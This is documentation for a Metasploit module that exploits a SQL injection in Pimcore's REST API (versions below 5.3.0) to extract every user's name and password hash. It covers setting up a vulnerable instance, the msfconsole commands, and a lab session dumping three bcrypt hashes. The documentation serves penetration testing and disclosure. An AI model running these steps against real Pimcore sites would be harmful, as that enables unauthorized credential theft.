## Description

  This module exploits a SQL injection vulnerability in Pimcore's REST web service for versions below 5.3.0. By using a UNION query on the `object inquire` service, this module can steal the usernames and password hashes of all users of Pimcore.

  Pimcore begins to create password hashes by concatenating a user's username, the name of the application, and the user's password like so: `USERNAME:pimcore:PASSWORD`.
  The resulting string is then used to generate an MD5 hash, and then that MD5 hash is used to create the final hash, which is generated using PHP's built-in `password_hash` function.

## Vulnerable Application

  Installing composer and running `php composer.phar create-project pimcore/pimcore=5.2.3 ./myproject --no-dev` will install Pimcore and most of its dependencies.
  The installation process will give notifications on missing PHP extensions that are required. Additionally, a web server and database must be set up.

  Source for Pimcore v5.2.3 can also be found [here](https://www.exploit-db.com/apps/7c759b5b7f2896a7d5461582e149bcaa-pimcore-5.2.3.tar.gz)

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use auxiliary/sqli/oracle/pimcore_list_creds`
  3. Do: `set RHOSTS [IP]`
  3. Do: `set TARGETURI [URI]`
  3. Do: `set APIKEY [KEY]`
  4. Do: `run`
  5. You should get a list of Pimcore user credentials

## Options

  **APIKEY**

  Valid API key for accessing Pimcore's REST API in order to perform the injection.

## Scenarios

### Tested on Ubuntu 18.04.1 Running Pimcore v5.2.3


  ```
  msf5 > use auxiliary/sqli/oracle/pimcore_list_creds
  msf5 auxiliary(sqli/oracle/pimcore_list_creds) > set rhosts 192.168.37.246
  rhosts => 192.168.37.246
  msf5 auxiliary(sqli/oracle/pimcore_list_creds) > set apikey 77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b
  apikey => 77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b
  msf5 auxiliary(sqli/oracle/pimcore_list_creds) > run

  [+] Credentials obtained:
  [+] admin : $2y$10$sBaD3EOAm/i1F3Mm/fwseeq3nyoacdlUt4NkVLZUgJ4FTReJSKIbe
  [+] secondUser : $2y$10$DYaFjrYnajTmVhhXSmsh8O5rLrQuPt8Q9Dto3vaQ4747K5kSvWEPy
  [+] blah : $2y$10$sJWr.puqXnF5T3DI3L1oqu3aIJRjUtHs9.2pgHEkevEdGrGvO1cBC
  [*] Auxiliary module execution completed
  ```
